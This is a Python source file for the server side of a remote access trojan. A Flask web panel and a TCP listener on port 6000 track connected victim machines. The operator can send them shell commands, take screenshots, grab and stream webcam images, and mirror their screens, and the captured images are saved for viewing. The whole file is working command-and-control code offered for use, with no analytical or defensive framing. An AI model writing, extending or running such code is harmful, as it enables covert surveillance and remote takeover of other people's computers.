from flask import Flask, render_template, jsonify, request
import threading
import socket
import json
import struct
import time
import uuid

import base64
import os

# Configuration
WEB_PORT = 5000
RAT_PORT = 6000
RAT_HOST = '0.0.0.0'

app = Flask(__name__)

# Global State
clients = {} # {id: {'conn': conn, 'addr': addr, 'info': {}, 'last_seen': ts, 'responses': []}}
# Lock for thread safety
clients_lock = threading.Lock()

class TCPServer(threading.Thread):
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            print(f"[*] RAT TCP Server listening on {self.host}:{self.port}")
            while self.running:
                conn, addr = self.sock.accept()
                client_id = str(uuid.uuid4())
                print(f"[+] New connection: {addr} (ID: {client_id})")
                
                with clients_lock:
                    clients[client_id] = {
                        'conn': conn,
                        'addr': addr,
                        'info': {'hostname': 'Unknown', 'os': 'Unknown'},
                        'last_seen': time.time(),
                        'responses': []
                    }
                
                # Handle client in separate thread
                threading.Thread(target=self.handle_client, args=(client_id, conn), daemon=True).start()
        except Exception as e:
            print(f"[!] Server crash: {e}")

    def handle_client(self, client_id, conn):
        while True:
            try:
                # Expect length header
                header = self.recv_all(conn, 4)
                if not header:
                    break
                length = struct.unpack('!I', header)[0]
                data = self.recv_all(conn, length)
                if not data:
                    break
                
                msg = json.loads(data.decode('utf-8'))
                
                # Special handling for stream frames (Cameron)
                if msg.get('type') == 'stream_frame':
                    if 'image_b64' in msg:
                        try:
                            img_data = base64.b64decode(msg['image_b64'])
                            filename = f"stream_{client_id}.jpg" 
                            # FIX: Use app.root_path to ensure we write to the correct Server/static folder
                            filepath = os.path.join(app.root_path, 'static', 'captures', filename)
                            os.makedirs(os.path.dirname(filepath), exist_ok=True)
                            with open(filepath, 'wb') as f:
                                f.write(img_data)
                            
                            with clients_lock:
                                if client_id in clients:
                                    clients[client_id]['last_seen'] = time.time()
                        except:
                            pass
                    continue 

                # Special handling for screen frames (Screen Mirror)
                if msg.get('type') == 'screen_frame':
                    if 'image_b64' in msg:
                        try:
                            img_data = base64.b64decode(msg['image_b64'])
                            filename = f"screen_{client_id}.jpg" 
                            filepath = os.path.join(app.root_path, 'static', 'captures', filename)
                            os.makedirs(os.path.dirname(filepath), exist_ok=True)
                            with open(filepath, 'wb') as f:
                                f.write(img_data)
                            
                            with clients_lock:
                                if client_id in clients:
                                    clients[client_id]['last_seen'] = time.time()
                        except:
                            pass
                    continue

                # Process any images (single shot)
                if 'image_b64' in msg:
                    try:
                        img_data = base64.b64decode(msg['image_b64'])
                        filename = f"{client_id}_{int(time.time())}.png" 
                        # FIX: Use app.root_path
                        filepath = os.path.join(app.root_path, 'static', 'captures', filename)
                        
                        os.makedirs(os.path.dirname(filepath), exist_ok=True)
                        
                        with open(filepath, 'wb') as f:
                            f.write(img_data)
                        
                        del msg['image_b64']
                        msg['image_url'] = f"/static/captures/{filename}"
                    except Exception as e:
                        msg['error'] = f"Failed to save image: {e}"

                # Push response to global state for UI to pick up
                with clients_lock:
                    if client_id in clients:
                        clients[client_id]['responses'].append(msg)
                        clients[client_id]['last_seen'] = time.time()
                        
                        # Update info if present
                        if 'output' in msg and 'System:' in msg['output']:
                           # Very basic parsing for demo info update
                           clients[client_id]['info']['raw'] = msg['output']

            except Exception as e:
                print(f"[-] Client error {client_id}: {e}")
                break
        
        # Cleanup
        with clients_lock:
            if client_id in clients:
                del clients[client_id]
        print(f"[-] Client disconnected: {client_id}")
        conn.close()

    def recv_all(self, sock, size):
        data = b''
        while len(data) < size:
            try:
                chunk = sock.recv(size - len(data))
                if not chunk: return None
                data += chunk
            except:
                return None
        return data

    def send_command(self, client_id, cmd_dict):
        with clients_lock:
            client = clients.get(client_id)
            if not client:
                return False
            try:
                data = json.dumps(cmd_dict).encode('utf-8')
                length = struct.pack('!I', len(data))
                client['conn'].sendall(length + data)
                return True
            except:
                return False

# Start TCP Server in background
tcp_server = TCPServer(RAT_HOST, RAT_PORT)
tcp_server.daemon = True
tcp_server.start()

# --- Flask Routes ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/clients')
def api_clients():
    safe_list = []
    with clients_lock:
        for cid, c in clients.items():
            safe_list.append({
                'id': cid,
                'ip': c['addr'][0],
                'port': c['addr'][1],
                'last_seen': c['last_seen'],
                'info': c['info']
            })
    return jsonify(safe_list)

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.json
    client_id = data.get('id')
    command_str = data.get('command')
    
    if not client_id or not command_str:
        return jsonify({'error': 'Missing fields'}), 400
        
    # Build payload
    payload = {}
    cmd_parts = command_str.split(' ', 1)
    action = cmd_parts[0].lower()
    
    if action == 'shell':
        if len(cmd_parts) > 1:
            payload = {'type': 'shell', 'command': cmd_parts[1]}
        else:
             return jsonify({'error': 'Shell requires a command'}), 400
    elif action == 'info':
        payload = {'type': 'info'}
    elif action == 'screenshot':
        payload = {'type': 'screenshot'}
    elif action == 'camera':
        payload = {'type': 'camera'}
    elif action == 'stream':
        # stream start / stream stop
        if len(cmd_parts) > 1:
             sub_action = cmd_parts[1].lower()
             if sub_action in ['start', 'stop']:
                 payload = {'type': 'stream', 'action': sub_action}
             else:
                 return jsonify({'error': 'Usage: stream start|stop'}), 400
        else:
             return jsonify({'error': 'Usage: stream start|stop'}), 400
    elif action == 'monitor':
        # monitor start / monitor stop
        if len(cmd_parts) > 1:
             sub_action = cmd_parts[1].lower()
             if sub_action in ['start', 'stop']:
                 payload = {'type': 'monitor', 'action': sub_action}
             else:
                 return jsonify({'error': 'Usage: monitor start|stop'}), 400
        else:
             return jsonify({'error': 'Usage: monitor start|stop'}), 400
    else:
        # Default fallback to shell for convenience? No, strict.
        return jsonify({'error': 'Unknown command type. Use: shell <cmd>, info, screenshot, camera, stream, monitor'}), 400

    success = tcp_server.send_command(client_id, payload)
    if success:
        return jsonify({'status': 'sent'})
    else:
        return jsonify({'error': 'Failed to send (client offline?)'}), 500

@app.route('/api/responses/<client_id>')
def api_responses(client_id):
    with clients_lock:
        client = clients.get(client_id)
        if not client:
            return jsonify([])
        # Return and clear buffer
        res = list(client['responses'])
        client['responses'] = [] 
        return jsonify(res)

if __name__ == '__main__':
    print(f"[*] Starting Web Interface on port {WEB_PORT}...")
    app.run(host='0.0.0.0', port=WEB_PORT, debug=False, use_reloader=False)
